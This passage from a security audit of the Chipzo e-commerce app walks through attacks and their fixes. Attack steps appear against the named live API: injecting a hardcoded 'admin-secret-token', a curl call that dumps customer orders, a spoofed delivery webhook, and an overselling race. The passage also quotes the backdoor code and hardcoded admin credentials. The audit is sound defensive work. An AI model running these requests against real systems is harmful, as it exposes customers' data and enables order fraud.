**Step 1:** Attacker opens DevTools → Sources → searches for "admin" in the minified JS
**Step 2:** Finds `'admin-secret-token'` string literal in the bundled code
**Step 3:**
```javascript
// In browser console:
localStorage.setItem('chipzo_token', 'admin-secret-token');
// Reload page — now logged in as admin
```
**Step 4:** Access admin panel, view all orders, customer data, update order statuses, delete orders

**Alternatively with curl:**
```bash
curl https://api.chipzo.in/api/orders/admin \
  -H "Authorization: Bearer admin-secret-token"
# Returns all customer orders with addresses and payment details
```

**The fix:** Delete these lines from both files. Create a real admin account via DB manipulation.

---

### Walkthrough C: Webhook Spoofing

**Step 1:** Attacker places a legitimate order. Gets their order's `_id` from the success page.

**Step 2:** Places another order, intentionally fails the payment. Gets the `razorpayOrderId` from the failure response.

**Step 3:** Sends a fake Borzo webhook to mark their unpaid order as delivered:
```bash
curl -X POST https://api.chipzo.in/api/webhook/borzo \
  -H "Content-Type: application/json" \
  -d '{"event_type": "delivery_changed", "order": {"order_id": "THEIR_ORDER_ID"}, "delivery": {"status": "delivered"}}'
```

**Step 4:** If `handleBorzoWebhook` updates delivery status without payment verification, the attacker has an item marked as delivered without paying.

**The fix:** Implement signature verification for all webhooks. Also, ensure webhook handlers check `paymentStatus === 'paid'` before updating delivery status.

---

### Walkthrough D: Inventory Race Condition (Overselling)

**Step 1:** Product has `stock: 1`. Two attackers coordinate.

**Step 2:** Both place identical orders to `/api/orders` (both succeed — this endpoint doesn't check stock). Both get valid Razorpay order IDs.

**Step 3:** Both pay Razorpay simultaneously. Both get valid signatures.

**Step 4:** Both POST to `/api/payment/verify` within milliseconds of each other.

**Step 5 — Without atomic operations:** Both threads execute the (future) stock check simultaneously, both see `stock: 1 >= 1`, both pass, both create orders. Result: 2 fulfilled orders, 1 unit of stock.

**The fix:** Use the `findOneAndUpdate` with condition shown in Part 6. Wrap in a MongoDB transaction.

---

## Part 11 — Prevention Strategy Comparison

### Price Validation: Three Approaches

| Approach | How It Works | Security | Performance | Complexity |
|---|---|---|---|---|
| **A: Ignore client price entirely** | Always fetch price from DB in verifyPayment | ✅ Bulletproof | DB query per item | Low |
| **B: Compare client price to DB price** | Accept if within tolerance | ⚠️ Edge cases (price changes mid-order) | Same as A | Medium |
| **C: Verify with Razorpay API** | Fetch Razorpay order, compare amount | ✅ Bulletproof (gateway-confirmed) | Extra API call | Medium |
| **D: A + C combined** | DB price + gateway verification | ✅✅ Defense in depth | 2 extra calls | Medium |

**Recommendation:** Implement **A** now (immediate fix, zero extra complexity), add **C** as a secondary check.

### Inventory Management: Three Approaches

| Approach | Prevents Oversell | Performance | Complexity | Recovery |
|---|---|---|---|---|
| **Atomic findOneAndUpdate** | ✅ | Excellent | Low | None needed |
| **MongoDB Transactions** | ✅✅ | Good | Medium | Auto-rollback |
| **Redis-based Redlock** | ✅✅ | Good | High | Requires Redis infra |
| **Reservation pattern** | ✅ with expiry | Good | High | Expiry cleanup job |

**Recommendation for Chipzo:** Start with **Atomic findOneAndUpdate** (implement today), wrap order creation in a **MongoDB Transaction** (implement this week). Redis lock only needed for extremely high-concurrency scenarios.

### Admin Authentication: Two Approaches

| Approach | Security | Implementation |
|---|---|---|
| **Hardcoded token** (current) | 🔴 Critical vulnerability | Already done (wrong) |
| **DB-persisted role field** | ✅ Correct | Add `role` to User schema, protect admin routes with `req.user.role === 'admin'` |
| **Separate admin service/domain** | ✅✅ Best | Separate auth system, separate deployment |

**Recommendation:** Add `role` to User schema immediately and remove the backdoor.

---

## Part 12 — Secure Architecture Recommendations

### Corrected `verifyPayment` Flow

```
[Client sends: orderId, paymentId, signature, cartSnapshot, address]
        |
        v
[1. Auth: JWT valid, user exists]
        |
        v
[2. Duplicate check: paymentId or orderId already in DB?] → return existing order
        |
        v
[3. Verify Razorpay signature (HMAC-SHA256)]
        |
        v
[4. Fetch Razorpay order: razorpay.orders.fetch(orderId)]
[   Verify orderId.notes.userId === req.user._id (ownership)]
        |
        v
[5. Fetch products from DB by productId]
[   Compute serverTotal = sum(product.price * quantity)]
        |
        v
[6. Assert: rzpOrder.amount === Math.round(serverTotal * 100)]
        |
        v
[7. Fetch Razorpay payment: razorpay.payments.fetch(paymentId)]
[   Assert: payment.status === 'captured']
[   Assert: payment.order_id === orderId]
        |
        v
[8. MongoDB Transaction: {]
[   - Atomic stock decrement for each item]
[   - Create Order document (paymentStatus: 'paid')]
[   - Clear cart]
[}]
        |
        v
[9. Fire async tasks: email, invoice, delivery, WhatsApp]
```

---

## Part 13 — Security Checklist for Chipzo

### 🔴 Critical — Fix Immediately

- [ ] Remove hardcoded `admin-secret-token` backdoor from `auth.middleware.js` (L23–31)
- [ ] Remove hardcoded admin credentials from `AuthContext.jsx` (L47–55)
- [ ] Add `role` field to User schema; create real admin account via DB
- [ ] In `verifyPayment`, use ONLY `product.price` (from DB) — remove `item.price` trust
- [ ] In `verifyPayment`, never use `cartSnapshot.totalAmount` — always recompute from DB
- [ ] Remove dev signature bypass from `payment.service.js` (L46–52)
- [ ] Add webhook signature verification to Shiprocket endpoint
- [ ] Add IP allowlisting or webhook token to Borzo endpoint

### 🟠 High — Fix This Week

- [ ] Add `Product.in_stock` and `Product.stock >= quantity` check at cart-add and payment time
- [ ] Replace separate find+update with atomic `findOneAndUpdate` for stock decrement
- [ ] Wrap order creation + stock decrement in MongoDB transaction
- [ ] Add `razorpay.orders.fetch()` to verify actual payment amount
- [ ] Add `razorpay.payments.fetch()` to verify payment captured status

### 🟡 Medium — Fix This Month

- [ ] Move JWT from `localStorage` to `HttpOnly` cookie
- [ ] Add token invalidation list (or `invalidatedBefore` timestamp) to handle logout properly
- [ ] Add per-user rate limiting on order endpoints (not just IP-based)
- [ ] Add Joi validation schema to `/api/payment/verify` endpoint
- [ ] Change `addressSchema.unknown(true)` to `unknown(false)` in order validator
- [ ] Add server-side shipping computation to `initiateOrder`
- [ ] Add `operatingHours` and `bangaloreOnly` validation to backend
- [ ] Log stock changes and payment events to an immutable DB audit collection
- [ ] Add stock restoration on order cancellation/deletion

### 🟢 Good — Maintain These

- ✅ Helmet.js security headers configured
- ✅ `express-mongo-sanitize` prevents NoSQL injection
- ✅ `hpp` prevents HTTP parameter pollution
- ✅ Joi validation on cart and auth endpoints
- ✅ bcrypt with 12 rounds for passwords
- ✅ `timingSafeEqual` for signature comparison (prevents timing attacks)
- ✅ CORS properly configured with origin allowlist (not `*`)
- ✅ `getOrderById` scopes to `userId` (correct IDOR prevention)
- ✅ Admin routes guarded by `adminOnly` middleware (correct pattern, just the wrong auth)
- ✅ Error handler strips stack traces in production
- ✅ Request body size limited to 10KB
- ✅ Duplicate paymentId and razorpayOrderId checks (idempotency)

---

## Appendix: Code Snippets for Immediate Fixes

### Fix 1: Secure `verifyPayment` Price Handling

Replace lines 70–90 of [`payment.controller.js`](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/payment.controller.js):

```javascript
// Build validated items using ONLY DB prices
const validatedItems = items.map((item) => {
    if (!item.productId) {
        throw new ApiError(400, 'Each item must have a productId.');
    }
    const product = productMap[item.productId.toString()];
    if (!product) {
        throw new ApiError(404, `Product not found: ${item.productId}`);
    }
    if (!product.in_stock || product.stock < (item.quantity || 1)) {
        throw new ApiError(409, `Insufficient stock for: ${product.name}`);
    }
    return {
        productId: item.productId,
        name: product.name,           // From DB
        price: product.price,         // From DB — NEVER from client
        quantity: item.quantity || 1,
        dbPrice: product.price,       // Explicit alias for clarity
    };
});

// Compute total from DB prices only — ignore any client-provided totalAmount
const serverTotal = validatedItems.reduce(
    (sum, item) => sum + item.dbPrice * item.quantity, 0
);
```

### Fix 2: Remove Admin Backdoor

Remove from [`auth.middleware.js`](file:///home/vinith/Desktop/chipzo-2/server/src/middleware/auth.middleware.js) lines 22–31:
```javascript
// DELETE THESE LINES:
// MOCK ADMIN SYSTEM AUTHENTICATION
if (token === 'admin-secret-token') {
    req.user = { ... };
    return next();
}
```

Remove from [`AuthContext.jsx`](file:///home/vinith/Desktop/chipzo-2/Chipzo-Web-main/Chipzo-Web-main/src/contexts/AuthContext.jsx) lines 47–55:
```javascript
// DELETE THESE LINES:
if ((normalizedEmail === 'admin' || normalizedEmail === 'admin@chipzo.in') && password === 'admin123') {
    ...
}
```

Add `role` to User schema:
```javascript
role: {
    type: String,
    enum: ['user', 'admin'],
    default: 'user',
    select: false,  // Don't expose in default queries
},
```

### Fix 3: Atomic Inventory Decrement

Add to [`payment.controller.js`](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/payment.controller.js) after signature verification:

```javascript
// Atomic stock reservation — all or nothing via transaction
const session = await mongoose.startSession();
let order;
try {
    await session.withTransaction(async () => {
        // Decrement stock atomically for each item
        for (const item of validatedItems) {
            const result = await Product.findOneAndUpdate(
                { _id: item.productId, in_stock: true, stock: { $gte: item.quantity } },
                { $inc: { stock: -item.quantity } },
                { session, new: true }
            );
            if (!result) {
                throw new ApiError(409, `"${item.name}" is out of stock.`);
            }
            // Auto-mark out of stock if depleted
            if (result.stock === 0) {
                result.in_stock = false;
                await result.save({ session });
            }
        }
        // Create order inside transaction
        order = await orderService.createOrder({
            userId: req.user._id,
            items: validatedItems,
            totalAmount: serverTotal,
            address, paymentId: razorpayPaymentId,
            razorpayOrderId, paymentSignature: razorpaySignature,
        }, session);
        // Clear cart inside transaction
        await cartService.clearCart(req.user._id, session);
    });
} finally {
    await session.endSession();
}
```
